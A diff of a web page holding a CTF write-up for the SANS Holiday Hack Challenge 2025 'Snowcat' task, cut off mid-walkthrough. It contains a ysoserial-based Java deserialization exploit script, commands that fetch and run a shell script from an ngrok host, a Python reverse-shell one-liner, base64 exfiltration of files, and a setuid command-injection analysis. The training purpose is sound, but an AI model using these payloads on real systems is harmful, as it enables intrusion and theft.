@@ -32,29 +32,29 @@ Tom Hessman mission statement Hi, I’m Tom! I’ve worked for Counter Hack sinc
 I love all things testing and QA, maintaining systems, logistics, and helping our customers have the best possible experience.">
     <meta itemprop="datePublished" content="2025-12-12T11:48:06+01:00">
     <meta itemprop="dateModified" content="2025-12-12T11:48:06+01:00">
-    <meta itemprop="wordCount" content="200">
+    <meta itemprop="wordCount" content="1454">
     <title>Snowcat RCE &amp; Priv Esc :: SANS Holiday Hack Challenge 2025</title>
     <link href="/act3/snowcat-rce-and-priv-esc/index.xml" rel="alternate" type="application/rss+xml" title="Snowcat RCE &amp; Priv Esc :: SANS Holiday Hack Challenge 2025">
-    <link href="/css/auto-complete/auto-complete.min.css?1765618621" rel="stylesheet">
-    <script src="/js/auto-complete/auto-complete.min.js?1765618621" defer></script>
-    <script src="/js/search-lunr.js?1765618621" defer></script>
-    <script src="/js/search.js?1765618621" defer></script>
+    <link href="/css/auto-complete/auto-complete.min.css?1765798844" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1765798844" defer></script>
+    <script src="/js/search-lunr.js?1765798844" defer></script>
+    <script src="/js/search.js?1765798844" defer></script>
     <script>
       window.relearn = window.relearn || {};
-      window.relearn.index_js_url="/searchindex.en.js?1765618621";
+      window.relearn.index_js_url="/searchindex.en.js?1765798844";
     </script>
-    <script src="/js/lunr/lunr.min.js?1765618621" defer></script>
-    <script src="/js/lunr/lunr.stemmer.support.min.js?1765618621" defer></script>
-    <script src="/js/lunr/lunr.multi.min.js?1765618621" defer></script>
-    <script src="/js/lunr/lunr.en.min.js?1765618621" defer></script>
+    <script src="/js/lunr/lunr.min.js?1765798844" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1765798844" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1765798844" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1765798844" defer></script>
     <script>
       window.relearn = window.relearn || {};
       window.relearn.contentLangs=['en'];
     </script>
-    <link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765618621" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765618621" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1765618621" rel="stylesheet">
-    <link href="/css/theme.css?1765618621" rel="stylesheet">
-    <link href="/css/format-html.css?1765618621" rel="stylesheet" id="R-format-style">
+    <link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765798844" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765798844" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1765798844" rel="stylesheet">
+    <link href="/css/theme.css?1765798844" rel="stylesheet">
+    <link href="/css/format-html.css?1765798844" rel="stylesheet" id="R-format-style">
     <script>
       window.relearn = window.relearn || {};
       // configuration
@@ -127,7 +127,12 @@ I love all things testing and QA, maintaining systems, logistics, and helping ou
   <ul>
     <li><a href="#objective">Objective</a></li>
     <li><a href="#tom-hessman-mission-statement">Tom Hessman mission statement</a></li>
-    <li><a href="#solution">Solution</a></li>
+    <li><a href="#solution">Solution</a>
+      <ul>
+        <li><a href="#setup-attack-infrastructure">Setup attack infrastructure</a></li>
+        <li><a href="#reverse-shell">Reverse shell</a></li>
+      </ul>
+    </li>
     <li><a href="#tom-hessman-mission-debrief">Tom Hessman mission debrief</a></li>
   </ul>
 </nav>
@@ -165,8 +170,8 @@ I love all things testing and QA, maintaining systems, logistics, and helping ou
 
 <h1 id="snowcat-rce--priv-esc">Snowcat RCE &amp; Priv Esc</h1>
 
-<p><a href="#R-image-e6268b89ba5613cc83d4faac87ba16ff" class="lightbox-link"><img alt="Tom Hessman" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/tomhessman-avatar.gif" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-e6268b89ba5613cc83d4faac87ba16ff"><img alt="Tom Hessman" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/tomhessman-avatar.gif"></a></p>
+<p><a href="#R-image-4aaa030b695b52b86ed4786c5351e30f" class="lightbox-link"><img alt="Tom Hessman" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/tomhessman-avatar.gif" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-4aaa030b695b52b86ed4786c5351e30f"><img alt="Tom Hessman" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/tomhessman-avatar.gif"></a></p>
 <h2 id="objective">Objective</h2>
 <p>Difficulty: 3/5</p>
 <p>Tom, in the hotel, found a wild Snowcat bug. Help him chase down the RCE! Recover and submit the API key not being used by snowcat.</p>
@@ -186,10 +191,242 @@ I love all things testing and QA, maintaining systems, logistics, and helping ou
 <p>If Frosty&rsquo;s plan works and everything freezes over, our customers won&rsquo;t be having the best possible experience—they&rsquo;ll be having the coldest possible experience! We need to stop this before the whole neighborhood becomes one giant freezer.</p>
 </blockquote>
 <h2 id="solution">Solution</h2>
-<p><a href="#R-image-d1a0c99fd98a605104eac5abb41ae53c" class="lightbox-link"><img alt="Solution" class="lazy lightbox figure-image" loading="lazy" src="/images/act1/visual-network-thinger-1.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-d1a0c99fd98a605104eac5abb41ae53c"><img alt="Solution" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act1/visual-network-thinger-1.png"></a></p>
+<p>Starting out I were left with a message at the terminal:</p>
+<p><a href="#R-image-17a11e8946f60ce98217d856e27bb795" class="lightbox-link"><img alt="Introduction terminal" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-snowcat-1.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-17a11e8946f60ce98217d856e27bb795"><img alt="Introduction terminal" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-snowcat-1.png"></a></p>
+<p>Listing what I got nearby I saw there was a <em>notes.md</em> file. Outputting it to screen gave some hints:</p>
+<p><a href="#R-image-8ba1ccd7d00943ad9c8a5d24127b2e19" class="lightbox-link"><img alt="Listing folder and reading notes.md" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-snowcat-2.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-8ba1ccd7d00943ad9c8a5d24127b2e19"><img alt="Listing folder and reading notes.md" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-snowcat-2.png"></a></p>
+<p>The objective is pretty well laid out, like a step by step instruction. There&rsquo;s also a Python file nearby:</p>
+<p><a href="#R-image-4c7f21205c4211cbb305243bc90aa061" class="lightbox-link"><img alt="Looking at Python script" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-snowcat-3.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-4c7f21205c4211cbb305243bc90aa061"><img alt="Looking at Python script" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-snowcat-3.png"></a></p>
+<p>And also a folder with JSP pages:</p>
+<p><a href="#R-image-de9e86d86657bfcd88f45cf605dbb3ec" class="lightbox-link"><img alt="Looking at JSP files" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-snowcat-4.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-de9e86d86657bfcd88f45cf605dbb3ec"><img alt="Looking at JSP files" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-snowcat-4.png"></a></p>
+<p>I took all of these JSP pages and uploaded them to ChatGPT asking it for which libraries where in use and if there were any interesting artefacts in them, and I got this table:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Library / Component</th>
+          <th>Type</th>
+          <th>What it does</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Java Standard Library (JDK)</td>
+          <td>Core runtime</td>
+          <td>Provides I/O (<code>java.io</code>), process execution (<code>Runtime.exec</code>), primitive parsing, and general language features used throughout the JSP scriptlets.</td>
+      </tr>
+      <tr>
+          <td>JSP / Servlet API</td>
+          <td>Web framework</td>
+          <td>Enables server-side rendering, request/response handling, session management, redirects, and access to implicit objects (<code>request</code>, <code>response</code>, <code>session</code>, <code>out</code>).</td>
+      </tr>
+      <tr>
+          <td>Apache Commons Collections (3.x)</td>
+          <td>Utility library</td>
+          <td>Supplies <code>MultiValueMap</code>, used to store multiple values per key (here: min/max ranges for weather normalization).</td>
+      </tr>
+      <tr>
+          <td>SQLite JDBC (Xerial)</td>
+          <td>Database driver</td>
+          <td>Implements the JDBC driver (<code>org.sqlite.JDBC</code>) allowing Java/JSP code to connect to a local SQLite database file for authentication.</td>
+      </tr>
+      <tr>
+          <td>SQLite Database Engine</td>
+          <td>Embedded database</td>
+          <td>Stores user records (<code>users</code> table) used during login authentication.</td>
+      </tr>
+      <tr>
+          <td>External native binaries (<code>/usr/local/weather/*</code>)</td>
+          <td>OS-level dependencies</td>
+          <td>Executable programs invoked from Java to retrieve temperature, humidity, and pressure values via stdout.</td>
+      </tr>
+      <tr>
+          <td>CSS (<code>styles.css</code>)</td>
+          <td>Frontend styling</td>
+          <td>Provides layout and visual styling for login and dashboard pages.</td>
+      </tr>
+      <tr>
+          <td>JavaScript (<code>snowflakes.js</code>)</td>
+          <td>Frontend scripting</td>
+          <td>Adds client-side visual behavior (snowflake animation effect).</td>
+      </tr>
+      <tr>
+          <td>Servlet Container (e.g., Apache Tomcat)</td>
+          <td>Application server</td>
+          <td>Hosts the JSPs, provides the Servlet/JSP runtime, session handling, and integrates JDBC drivers and libraries on the classpath.</td>
+      </tr>
+  </tbody>
+</table>
+<p>Interesting - I felt had a relatively good understading of the site. However, by reading the <em>notes.md</em> I needed to figure out where this server running. I just took a wild guess since the server IP is never mentioned:</p>
+<p><a href="#R-image-3eed58ce862ca984a0231033e0d1f90d" class="lightbox-link"><img alt="Identifying Snowcat version" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-snowcat-10.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-3eed58ce862ca984a0231033e0d1f90d"><img alt="Identifying Snowcat version" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-snowcat-10.png"></a></p>
+<p>And I am in the server already! Thus turning my attention to take the Snowcat exploit in consideration. I followed the instructions in <em>notes.md</em> and crafted this script:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>HOST<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;localhost&#34;</span>
+</span></span><span style="display:flex;"><span>PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SESSION_ID<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -sS --head http://<span style="color:#e6db74">${</span>HOST<span style="color:#e6db74">}</span>:<span style="color:#e6db74">${</span>PORT<span style="color:#e6db74">}</span> | awk -F<span style="color:#e6db74">&#39;[=;]&#39;</span> <span style="color:#e6db74">&#39;/JSESSIONID/ {print $2}&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>COMMAND<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;curl https://webhook.site/cabdef54-8500-47d7-9906-0513f3c4587b&#34;</span>
+</span></span><span style="display:flex;"><span>java -jar ysoserial.jar CommonsCollections7 <span style="color:#e6db74">&#34;</span>$COMMAND<span style="color:#e6db74">&#34;</span> &gt; payload.bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>curl -X PUT <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Host: </span><span style="color:#e6db74">${</span>HOST<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span>PORT<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Length: </span><span style="color:#66d9ef">$(</span>wc -c &lt; payload.bin<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Range: bytes 0-</span><span style="color:#66d9ef">$(($(</span>wc -c &lt; payload.bin<span style="color:#66d9ef">)</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#66d9ef">))</span><span style="color:#e6db74">/</span><span style="color:#66d9ef">$(</span>wc -c &lt; payload.bin<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --data-binary @payload.bin <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">${</span>HOST<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span>PORT<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">${</span>SESSION_ID<span style="color:#e6db74">}</span><span style="color:#e6db74">/session&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>curl -X GET <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Host: </span><span style="color:#e6db74">${</span>HOST<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span>PORT<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Cookie: JSESSIONID=.</span><span style="color:#e6db74">${</span>SESSION_ID<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">${</span>HOST<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span>PORT<span style="color:#e6db74">}</span><span style="color:#e6db74">/&#34;</span></span></span></code></pre></div>
+<p>As a proof of concept I was able to reach out to my <em>webhook.site</em>. After some tries and pondering, I finally found out how to create a reverse shell. It turns out there has to be some filtering going on or other interference. The usual Linux options to run code sequentially, <code>&amp;&amp;</code> and <code>;</code>, did not work. The solution I cooked up was to split all operations into separate stesp and run them. The easiest way was to implent a function like so:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>HOST<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;localhost&#34;</span>
+</span></span><span style="display:flex;"><span>PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>SESSION_ID<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -sS --head http://<span style="color:#e6db74">${</span>HOST<span style="color:#e6db74">}</span>:<span style="color:#e6db74">${</span>PORT<span style="color:#e6db74">}</span> | awk -F<span style="color:#e6db74">&#39;[=;]&#39;</span> <span style="color:#e6db74">&#39;/JSESSIONID/ {print $2}&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>run_attack<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        local COMMAND<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        java -jar ysoserial.jar CommonsCollections7 <span style="color:#e6db74">&#34;</span>$COMMAND<span style="color:#e6db74">&#34;</span> &gt; payload.bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        curl -X PUT <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>          -H <span style="color:#e6db74">&#34;Host: </span><span style="color:#e6db74">${</span>HOST<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span>PORT<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>          -H <span style="color:#e6db74">&#34;Content-Length: </span><span style="color:#66d9ef">$(</span>wc -c &lt; payload.bin<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>          -H <span style="color:#e6db74">&#34;Content-Range: bytes 0-</span><span style="color:#66d9ef">$(($(</span>wc -c &lt; payload.bin<span style="color:#66d9ef">)</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#66d9ef">))</span><span style="color:#e6db74">/</span><span style="color:#66d9ef">$(</span>wc -c &lt; payload.bin<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>          --data-binary @payload.bin <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>          <span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">${</span>HOST<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span>PORT<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">${</span>SESSION_ID<span style="color:#e6db74">}</span><span style="color:#e6db74">/session&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        curl -X GET <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>          -H <span style="color:#e6db74">&#34;Host: </span><span style="color:#e6db74">${</span>HOST<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span>PORT<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>          -H <span style="color:#e6db74">&#34;Cookie: JSESSIONID=.</span><span style="color:#e6db74">${</span>SESSION_ID<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>          <span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">${</span>HOST<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span>PORT<span style="color:#e6db74">}</span><span style="color:#e6db74">/&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>run_attack <span style="color:#e6db74">&#34;curl -s https://scarabaeiform-prolixly-odin.ngrok-free.dev/shell.sh -o /tmp/shell.sh&#34;</span>
+</span></span><span style="display:flex;"><span>run_attack <span style="color:#e6db74">&#34;sh /tmp/shell.sh&#34;</span></span></span></code></pre></div>
+<h3 id="setup-attack-infrastructure">Setup attack infrastructure</h3>
+<p>Before running the payload creating the reverse shell, I had to set up my infrastructure. This is the same infrastructure I used on <em>&ldquo;Hack a Gnome&rdquo;</em>. The infrastructure is based on <a href="https://ngrok.com/" rel="external">Ngrok</a> and Kali in WSL (in total four instances):</p>
+<table>
+  <thead>
+      <tr>
+          <th>Command</th>
+          <th>Public</th>
+          <th>Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>ngrok tcp 8501</td>
+          <td>Yes</td>
+          <td>Public exposed reverse shell port through Ngrok</td>
+      </tr>
+      <tr>
+          <td>nc -lnvp 8501</td>
+          <td>No</td>
+          <td>Local (attacking machine) listening port using Netcat mapped to public Ngrok bridge</td>
+      </tr>
+      <tr>
+          <td>ngrok http 8001</td>
+          <td>Yes</td>
+          <td>Public exposed web server for serving scripts</td>
+      </tr>
+      <tr>
+          <td>python3 -m http.server 8001</td>
+          <td>No</td>
+          <td>Local (attacking machine) web server mapped to public Ngrok bridge</td>
+      </tr>
+  </tbody>
+</table>
+<p>The architecture looks like this:</p>
+<pre class="mermaid align-center ">---
+config:
+      theme: redux
+---
+flowchart LR
+    subgraph Attacker[&#34;Attacking machine&#34;]
+        webserver
+        netcat
+    end
+
+    subgraph NGROK[&#34;NGROK&#34;]
+        HTTP
+        TCP
+    end
+
+    SGCC[&#34;Smart Gnome Control Center&#34;] &lt;--TCP/443--&gt; HTTP
+    SGCC[&#34;Smart Gnome Control Center&#34;] &lt;--TCP/19342--&gt; TCP
+    HTTP &lt;--TCP/8001--&gt; webserver[&#34;Python webserver&#34;]
+    TCP &lt;--TCP/8501--&gt; netcat[&#34;Netcat listener&#34;]</pre>
+<h3 id="reverse-shell">Reverse shell</h3>
+<p>Launching my payload resulted in a reverse shell:</p>
+<p><a href="#R-image-ffd7ec17ccb344141bdf7d5007131ffc" class="lightbox-link"><img alt="Got reverse shell" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-snowcat-5.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-ffd7ec17ccb344141bdf7d5007131ffc"><img alt="Got reverse shell" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-snowcat-5.png"></a></p>
+<p>The magic behind it is this Python piece:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;5.tcp.eu.ngrok.io&#34;,18288));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span></span></span></code></pre></div>
+<p>I host this on my webserver. I have instructed my payload to reach out to my webserver, download the script and execute it. When I got shell, I had to upgrade it by issuing:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span></span></span></code></pre></div>
+<p>This is classical CTF. At this point I wondered if I could find the SQLite database ChatGPT told me about. Finding out where Snowcat lives:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -type f -name snowcat</span></span></code></pre></div>
+<p>I found directory <em>/usr/local/snowcat/</em>. Entering the folder and finding the database, smuggle it out as Base64 string:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /usr/local/snowcat/
+</span></span><span style="display:flex;"><span>find . -name <span style="color:#e6db74">&#34;weather.db&#34;</span>
+</span></span><span style="display:flex;"><span>cd /usr/local/snowcat/webapps/ROOT/WEB-INF/classes
+</span></span><span style="display:flex;"><span>cat weather.db | base64</span></span></code></pre></div>
+<p>I copied the Base64 encoded string to my Kali box, decoded and opened it in SQLitebrowser:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat sqlite.txt | base64 -d &gt; weather.db
+</span></span><span style="display:flex;"><span>sqlitebrowser weather.db</span></span></code></pre></div>
+<p>Turns out there is just one table here and it contains one password in cleartext:</p>
+<p><a href="#R-image-0d2cc469ba95ffbc39d16243a5c636d0" class="lightbox-link"><img alt="Passwords" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-snowcat-11.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-0d2cc469ba95ffbc39d16243a5c636d0"><img alt="Passwords" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-snowcat-11.png"></a></p>
+<p>However, I now figured out that the rest of the objective could be solved without this reverse shell. Thus, my writeup takes a slight turn here, where I conduct the attack using the original <em>user</em> account. Moving on to finding finding binaries with the SUID flag set:</p>
+<p><a href="#R-image-887212ba397c0e0a40907c8e923596fa" class="lightbox-link"><img alt="Finding suid" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-snowcat-6.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-887212ba397c0e0a40907c8e923596fa"><img alt="Finding suid" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-snowcat-6.png"></a></p>
+<p>I identifed the <em>weather</em> folder and the binaries as relevant. Moving on to dissect the binaries I first smuggled them out to my Kali instance:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat humidity | base64
+</span></span><span style="display:flex;"><span>cat pressure | base64
+</span></span><span style="display:flex;"><span>cat temperature | base64</span></span></code></pre></div>
+<p>In Kali I converted them into binaries:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat humidity.txt | base64 -d &gt; humidity.bin
+</span></span><span style="display:flex;"><span>cat pressure.txt | base64 -d &gt; pressure.bin
+</span></span><span style="display:flex;"><span>cat temperature.txt | base64 -d &gt; temperature.bin</span></span></code></pre></div>
+<p>Then i opened each <em>.bin</em> file in <a href="https://dogbolt.org" rel="external">Dogbolt</a> to see if they had somethign interesting on the inside:</p>
+<p><a href="#R-image-ad6f06548bf1ccea4036199280b072d4" class="lightbox-link"><img alt="Dogbolt" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-snowcat-8.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-ad6f06548bf1ccea4036199280b072d4"><img alt="Dogbolt" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-snowcat-8.png"></a></p>
+<p>Of interesting strings I found the following:</p>
+<ul>
+<li>&ldquo;/usr/local/weather/config&rdquo;</li>
+<li>&ldquo;/usr/local/weather/data/humidity&rdquo;</li>
+<li>&ldquo;/usr/local/weather/logUsage&rdquo;</li>
+<li>&ldquo;/usr/local/weather/keys/authorized_keys&rdquo;</li>
+<li>&ldquo;/usr/local/weather/data/pressure&rdquo;</li>
+<li>&ldquo;/usr/local/weather/data/temperature&rdquo;</li>
+</ul>
+<p>Each binary contained mostly the same strings, one very interesting one was the <em>&quot;/usr/local/weather/keys/authorized_keys&quot;</em> file. It seems like this is the ultimate goal I am looking for. I now had myself a goal, but how to reach it? I took the decompiled code from one of these binaries and fed it into ChatGPT and asked if there were any vulnerabilities present. ChatGPT stated there was a command injection in <em>log_usage()</em> via <em>system()</em>:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">snprintf</span>(v1, <span style="color:#ae81ff">0x100</span>, <span style="color:#e6db74">&#34;%s &#39;%s&#39; &#39;%s&#39;&#34;</span>, <span style="color:#e6db74">&#34;/usr/local/weather/logUsage&#34;</span>, <span style="color:#e6db74">&#34;temperature&#34;</span>, a0);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(v1);</span></span></code></pre></div>
+<p>In which <em>a0</em> comes from <code>argv (&lt;key&gt;)</code>, so it’s attacker-controlled. Wrapping in single quotes is not considered safe: a key containing &rsquo; will break out of the quoted string and can inject shell syntax. Further ChatGPT stated &ldquo;If this binary is running with elevated privileges at this point (and it is: it calls setuid/setgid from config), this is a classic privilege escalation primitive.&rdquo;</p>
+<p>In order to exploit this I needed a valid key, and I found that in the <em>/home/user/weather-jsps</em> folder:</p>
